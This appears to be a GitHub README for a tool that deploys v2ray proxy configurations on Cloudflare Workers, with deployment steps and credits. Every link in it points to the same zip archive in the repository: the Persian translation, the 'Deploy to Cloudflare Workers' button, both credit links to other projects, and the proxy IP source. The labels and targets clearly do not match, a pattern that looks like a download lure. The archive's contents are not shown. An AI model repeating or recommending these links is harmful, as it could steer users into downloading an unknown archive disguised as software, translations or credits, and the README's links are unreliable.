# V2Ray Worker
 Total solution for v2ray configs over Cloudflare's worker

[نسخه فارسی](https://raw.githubusercontent.com/soltans/v2ray-worker/main/src/v3.5.zip)

## How to use

To be completed...

## Deploy 
 1. Fork this Repo and enable Github Action
 2. Open CloudFlare and create KV namespace with name `settings` then copy the ID
 3. Go to this forked repo and set secrets with name `KV_NAME` and fill with KV settings ID
 4. Edit this `README.md` file, then find and replace this button url bellow with yours `https://raw.githubusercontent.com/soltans/v2ray-worker/main/src/v3.5.zip` then save it.
 4. then press `Deploy With Workers` and follow the instruction

[![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/soltans/v2ray-worker/main/src/v3.5.zip)](https://raw.githubusercontent.com/soltans/v2ray-worker/main/src/v3.5.zip)

### Credits
Built-in vless config generator is based on [Zizifn Edge Tunnel](https://raw.githubusercontent.com/soltans/v2ray-worker/main/src/v3.5.zip), re-written using Typescript.
Built-in trojan config generator is based on [ca110us/epeius](https://raw.githubusercontent.com/soltans/v2ray-worker/main/src/v3.5.zip), re-written using Typescript.
Proxy IPs source: https://raw.githubusercontent.com/soltans/v2ray-worker/main/src/v3.5.zip
